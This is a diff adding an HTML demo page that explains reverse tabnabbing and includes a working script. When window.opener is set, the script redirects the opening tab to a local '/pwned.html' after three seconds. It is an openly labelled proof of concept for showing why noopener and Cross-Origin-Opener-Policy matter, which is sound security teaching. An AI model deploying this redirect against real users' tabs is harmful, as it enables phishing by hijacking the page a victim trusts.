@@ -1,0 +1,50 @@
+<!doctype html>
+<meta charset="utf-8">
+<title>Tabnabber demo</title>
+<style>
+	body {
+		font-family: system-ui, sans-serif;
+		max-width: 640px;
+		margin: 80px auto;
+		padding: 0 16px;
+		line-height: 1.5;
+	}
+	.status {
+		font-weight: bold;
+		padding: 12px;
+		border-radius: 6px;
+	}
+	.status.vulnerable {
+		background: #ffe5e5;
+		color: #a30000;
+	}
+	.status.safe {
+		background: #e5ffe9;
+		color: #116622;
+	}
+</style>
+<body>
+	<h1>Tabnabber demo</h1>
+	<p>
+		This page was opened by <code>window.open(url)</code> from another tab, without
+		<code>noopener</code>/<code>noreferrer</code> and without a
+		<code>Cross-Origin-Opener-Policy</code> header on the opener. That means this page can
+		reach back into the tab that opened it and navigate it elsewhere &mdash; a technique
+		called <a href="https://owasp.org/www-community/attacks/Reverse_Tabnabbing" target="_blank" rel="noopener">reverse tabnabbing</a>.
+	</p>
+	<p id="r" class="status">Checking...</p>
+	<script>
+		const el = document.getElementById('r');
+		const has = !!window.opener;
+		if (has) {
+			el.textContent = 'VULNERABLE: window.opener is set. Taking over the opener tab in 3 seconds...';
+			el.className = 'status vulnerable';
+			setTimeout(() => {
+				window.opener.location = '/pwned.html';
+			}, 3000);
+		} else {
+			el.textContent = 'Safe: window.opener is null.';
+			el.className = 'status safe';
+		}
+	</script>
+</body>
